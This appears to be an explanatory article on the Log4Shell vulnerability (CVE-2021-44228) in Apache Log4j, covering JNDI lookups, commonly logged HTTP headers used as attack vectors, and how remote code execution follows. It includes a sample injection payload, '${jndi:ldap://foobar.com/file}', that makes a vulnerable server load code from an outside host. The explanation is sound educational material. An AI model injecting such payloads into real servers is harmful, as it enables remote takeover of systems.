@@ -1,0 +1,21 @@
+Log4j is an open-source logging framework that allows software developers to log various data within their application and it is part of the Apache Logging Services, a project of the Apache Software Foundation. Log4j is used by thousands of websites and applications, to perform mundane functions such as logging information which can be used for debugging and other purposes.
+
+Log4j vulnerability tracked under CVE-2021–44228 (also known as Log4Shell & LogJam) is a zero-day, remote code execution vulnerability in logging framework. If a cyber-attacker exploits this, they can make the server that is running Log4j run any software they want, including software that can completely take over that server. It was discovered by researchers from Alibaba Cloud Security team, it was privately disclosed to Apache foundation on 24th November 2021 and publicly disclosed on 9th December 2021.
+
+To enhance logging functionality from basic log formatting, Log4j added the ability to perform lookups: map lookups, system properties lookups as well as Java Naming and Directory Interface (JNDI) lookups.
+
+
+https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html
+Log4j uses the JNDI API to obtain naming and directory services from several available service providers: Lightweight Directory Access Protocol (LDAP), Remote Method Invocation (RMI), Domain Name Service (DNS), Common Object Request Broker Architecture (CORBA), etc.
+
+The vulnerability takes advantage of Log4j not checking LDAP and JNDI requests and allowing attackers to execute arbitrary Java code on a server. This a classic example of missing input validation and blindly trusting the input without sanitisation. (In this case Log4j failed to sanitise URLs passed in these strings). The Apache Software Foundation, gave Log4Shell a CVSS rating of 10 (Critical), the highest available score
+
+How Log4j vulnerability works?
+
+https://threatlabs.juniper.net/
+HTTP requests are frequently logged, and a common attack vector is placing the malicious string in the HTTP request URL or a commonly logged HTTP header, such as User-Agent, X-Remote-IP, X-Forwarded-For, etc. There are dozens of headers that are typically logged. To exploit the vulnerability, an attacker must cause the application to save a special string of characters in the log. Since applications routinely log a wide range of events such as messages sent and received by users, or the details of system errors, this vulnerability is unusually easy to exploit and can be triggered in a variety of ways.
+
+An unauthenticated, remote attacker could exploit this flaw by sending a specially crafted request to a server running a vulnerable version of Log4j. The crafted request uses JNDI injection via a variety of services including: the LDAP, LDAPS, DNS, and Java’s RMI. If the vulnerable server uses Log4j to log requests, the exploit will then request a malicious payload over JNDI through one of the services mentioned above from an attacker-controlled server. JNDI allows for lookup of Java objects at program runtime given a path to their data and LDAP retrieves the object data as a URL from an appropriate server, either local or anywhere on the Internet.
+
+For example, one of the recognised expressions is ${jndi:<lookup>}, by specifying the lookup to be through LDAP, an arbitrary URL may be queried and loaded as Java object data. ${jndi:ldap://foobar.com/file}, which will load data from that URL if connected to the Internet. What happens behind the scenes is that when a server logs data containing the malicious payload ${jndi:ldap://foobar.com/file} in the request, the Log4j vulnerability is triggered and the server makes a request to foobar.com via the JNDI. This allows the attacker to inject a java class payload and practically execute arbitrary code on the logging server.
+
